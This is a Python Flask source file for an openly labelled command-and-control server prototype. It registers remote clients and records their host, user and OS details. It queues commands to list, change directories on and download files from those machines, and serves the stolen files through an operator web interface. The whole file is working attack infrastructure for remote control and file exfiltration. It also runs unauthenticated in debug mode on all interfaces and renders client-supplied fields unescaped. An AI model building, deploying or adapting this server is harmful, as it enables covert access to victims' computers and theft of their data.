"""
C2 Prototype - Server
"""

import os
import uuid
import time
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file
import tempfile

app = Flask(__name__)

# --- In-memory state ---
clients = {}       # client_id -> {hostname, username, os, cwd, last_seen}
task_queue = {}     # client_id -> {id, command, args}  (one pending task at a time)
results = {}        # task_id -> {result, timestamp}

TIMEOUT = 30  # seconds before a client is considered offline


# ============================================================
# Client API endpoints
# ============================================================

@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.json
    cid = data["client_id"]
    clients[cid] = {
        "hostname": data.get("hostname", "?"),
        "username": data.get("username", "?"),
        "os": data.get("os", "?"),
        "cwd": data.get("cwd", "?"),
        "last_seen": time.time(),
    }
    return jsonify({"status": "ok"})


@app.route("/api/tasks/<client_id>")
def api_get_task(client_id):
    if client_id in clients:
        clients[client_id]["last_seen"] = time.time()
    task = task_queue.pop(client_id, None)
    return jsonify({"task": task})


@app.route("/api/results/<client_id>", methods=["POST"])
def api_submit_result(client_id):
    data = request.json
    task_id = data["task_id"]
    results[task_id] = {
        "client_id": client_id,
        "result": data["result"],
        "timestamp": time.time(),
    }
    # Update cwd if the client changed directory
    r = data["result"]
    if isinstance(r, dict) and "output" in r and r["output"].startswith("Changed to "):
        clients[client_id]["cwd"] = r["output"].replace("Changed to ", "")
    return jsonify({"status": "ok"})


# ============================================================
# Operator API (used by web UI)
# ============================================================

@app.route("/api/send", methods=["POST"])
def api_send_command():
    """Queue a command for a client. Returns the task_id to poll for results."""
    data = request.json
    cid = data["client_id"]
    task_id = str(uuid.uuid4())[:8]
    task_queue[cid] = {
        "id": task_id,
        "command": data["command"],
        "args": data.get("args", ""),
    }
    return jsonify({"task_id": task_id})


@app.route("/api/result/<task_id>")
def api_get_result(task_id):
    """Poll for a task result."""
    if task_id in results:
        return jsonify({"done": True, "result": results[task_id]["result"]})
    return jsonify({"done": False})


@app.route("/api/download_file/<task_id>")
def api_download_file(task_id):
    """Download a file that was retrieved from a client."""
    if task_id not in results:
        return "Not found", 404
    r = results[task_id]["result"]
    if "data_b64" not in r:
        return "Not a file download result", 400
    raw = base64.b64decode(r["data_b64"])
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix="_" + r["filename"])
    tmp.write(raw)
    tmp.close()
    return send_file(tmp.name, as_attachment=True, download_name=r["filename"])


# ============================================================
# Web UI
# ============================================================

@app.route("/")
def index():
    return render_template_string(PAGE_HTML)


PAGE_HTML = r"""
<!DOCTYPE html>
<html>
<head>
<title>C2 Prototype</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0a; color: #e0e0e0; }
  h1 { padding: 16px 24px; background: #111; border-bottom: 1px solid #222; font-size: 18px; }
  .container { display: flex; height: calc(100vh - 53px); }
  .sidebar { width: 280px; border-right: 1px solid #222; padding: 12px; overflow-y: auto; }
  .main { flex: 1; padding: 20px; display: flex; flex-direction: column; overflow: hidden; }
  .client-card {
    padding: 10px; margin-bottom: 8px; background: #161616; border: 1px solid #222;
    border-radius: 6px; cursor: pointer; transition: border-color 0.15s;
  }
  .client-card:hover { border-color: #555; }
  .client-card.active { border-color: #4a9eff; }
  .client-card .hostname { font-weight: 600; }
  .client-card .meta { font-size: 12px; color: #888; margin-top: 4px; }
  .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
  .status-dot.online { background: #22c55e; }
  .status-dot.offline { background: #666; }
  .toolbar { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
  .toolbar button {
    padding: 6px 14px; background: #1e1e1e; border: 1px solid #333; color: #ccc;
    border-radius: 4px; cursor: pointer; font-size: 13px;
  }
  .toolbar button:hover { background: #2a2a2a; border-color: #4a9eff; color: #fff; }
  .path-bar { padding: 8px 12px; background: #161616; border: 1px solid #222; border-radius: 4px; margin-bottom: 12px; font-family: monospace; font-size: 13px; }
  .file-list { flex: 1; overflow-y: auto; border: 1px solid #222; border-radius: 4px; }
  .file-row {
    display: flex; align-items: center; padding: 6px 12px; border-bottom: 1px solid #1a1a1a;
    cursor: pointer; font-size: 13px; font-family: monospace;
  }
  .file-row:hover { background: #1a1a1a; }
  .file-row .icon { width: 24px; text-align: center; margin-right: 8px; }
  .file-row .name { flex: 1; }
  .file-row .size { color: #666; font-size: 12px; }
  .output-box {
    flex: 1; overflow-y: auto; background: #111; border: 1px solid #222;
    border-radius: 4px; padding: 12px; font-family: monospace; font-size: 13px;
    white-space: pre-wrap; min-height: 200px;
  }
  .empty { color: #555; text-align: center; padding: 40px; }
  .spinner { display: inline-block; animation: spin 1s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<h1>C2 Prototype</h1>
<div class="container">
  <div class="sidebar" id="sidebar">
    <div class="empty">No clients connected</div>
  </div>
  <div class="main">
    <div id="no-selection" class="empty" style="margin-top:80px;">Select a client from the sidebar</div>
    <div id="panel" style="display:none; flex:1; display:none; flex-direction:column;">
      <div class="toolbar">
        <button onclick="sendLs()">List Files</button>
        <button onclick="goUp()">Go Up</button>
        <button onclick="sendPwd()">PWD</button>
        <button onclick="promptCd()">CD to path...</button>
        <button onclick="promptDownload()">Download file...</button>
      </div>
      <div class="path-bar" id="pathbar">—</div>
      <div class="file-list" id="filelist">
        <div class="empty">Click "List Files" to start browsing</div>
      </div>
    </div>
  </div>
</div>

<script>
let selectedClient = null;
let currentPath = "";

// Poll for client list
async function refreshClients() {
  // We fetch the index page's data via a small JSON endpoint
}

// We'll poll a lightweight client-list endpoint
setInterval(fetchClients, 2000);
fetchClients();

async function fetchClients() {
  // Piggyback on the register data - add a list endpoint
  const resp = await fetch("/api/clients");
  const data = await resp.json();
  const sb = document.getElementById("sidebar");
  if (data.clients.length === 0) {
    sb.innerHTML = '<div class="empty">No clients connected</div>';
    return;
  }
  sb.innerHTML = data.clients.map(c => {
    const online = (Date.now()/1000 - c.last_seen) < 15;
    const cls = (selectedClient === c.id) ? "client-card active" : "client-card";
    return `<div class="${cls}" onclick="selectClient('${c.id}')">
      <div class="hostname"><span class="status-dot ${online?'online':'offline'}"></span>${c.hostname}</div>
      <div class="meta">${c.username} &middot; ${c.os} &middot; ${c.id}</div>
    </div>`;
  }).join("");
}

function selectClient(id) {
  selectedClient = id;
  document.getElementById("no-selection").style.display = "none";
  const panel = document.getElementById("panel");
  panel.style.display = "flex";
  document.getElementById("filelist").innerHTML = '<div class="empty">Click "List Files" to start browsing</div>';
  document.getElementById("pathbar").textContent = "—";
  fetchClients();
}

async function sendCommand(cmd, args) {
  if (!selectedClient) return;
  const resp = await fetch("/api/send", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({client_id: selectedClient, command: cmd, args: args || ""})
  });
  const {task_id} = await resp.json();
  return await waitForResult(task_id);
}

async function waitForResult(taskId) {
  const fl = document.getElementById("filelist");
  fl.innerHTML = '<div class="empty"><span class="spinner">&#9696;</span> Waiting for client response...</div>';
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 1000));
    const resp = await fetch(`/api/result/${taskId}`);
    const data = await resp.json();
    if (data.done) return {task_id: taskId, ...data.result};
  }
  return {error: "Timeout waiting for response"};
}

async function sendLs(path) {
  const result = await sendCommand("ls", path || "");
  renderLs(result);
}

function renderLs(result) {
  const fl = document.getElementById("filelist");
  if (result.error) {
    fl.innerHTML = `<div class="empty" style="color:#f87171;">${result.error}</div>`;
    return;
  }
  if (result.path) {
    currentPath = result.path;
    document.getElementById("pathbar").textContent = result.path;
  }
  if (!result.entries || result.entries.length === 0) {
    fl.innerHTML = '<div class="empty">Empty directory</div>';
    return;
  }
  fl.innerHTML = result.entries.map(e => {
    const icon = e.is_dir ? "&#128193;" : "&#128196;";
    const size = e.is_dir ? "" : formatSize(e.size);
    const action = e.is_dir
      ? `onclick="cdAndLs('${escHtml(e.name)}')"`
      : `onclick="downloadFile('${escHtml(e.name)}')"`;
    return `<div class="file-row" ${action}>
      <div class="icon">${icon}</div>
      <div class="name">${escHtml(e.name)}</div>
      <div class="size">${size}</div>
    </div>`;
  }).join("");
}

async function cdAndLs(name) {
  await sendCommand("cd", name);
  await sendLs();
}

async function goUp() {
  await sendCommand("cd", "..");
  await sendLs();
}

async function sendPwd() {
  const result = await sendCommand("pwd");
  if (result.output) {
    currentPath = result.output;
    document.getElementById("pathbar").textContent = result.output;
  }
}

function promptCd() {
  const p = prompt("Enter path:");
  if (p) { sendCommand("cd", p).then(() => sendLs()); }
}

async function downloadFile(name) {
  const result = await sendCommand("download", name);
  if (result.error) {
    alert("Error: " + result.error);
    return;
  }
  // Trigger browser download via the server endpoint
  window.open(`/api/download_file/${result.task_id}`, "_blank");
  // Restore file list view
  sendLs();
}

function promptDownload() {
  const p = prompt("Enter file path:");
  if (p) downloadFile(p);
}

function formatSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1024*1024) return (bytes/1024).toFixed(1) + " KB";
  return (bytes/(1024*1024)).toFixed(1) + " MB";
}

function escHtml(s) {
  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
}
</script>
</body>
</html>
"""


# Client list endpoint for the UI
@app.route("/api/clients")
def api_clients():
    now = time.time()
    client_list = []
    for cid, info in clients.items():
        client_list.append({
            "id": cid,
            "hostname": info["hostname"],
            "username": info["username"],
            "os": info["os"],
            "cwd": info["cwd"],
            "last_seen": info["last_seen"],
            "online": (now - info["last_seen"]) < TIMEOUT,
        })
    return jsonify({"clients": client_list})


if __name__ == "__main__":
    print("=" * 50)
    print("  C2 Prototype - Server")
    print("  http://localhost:5000")
    print("=" * 50)
    app.run(host="0.0.0.0", port=5000, debug=True)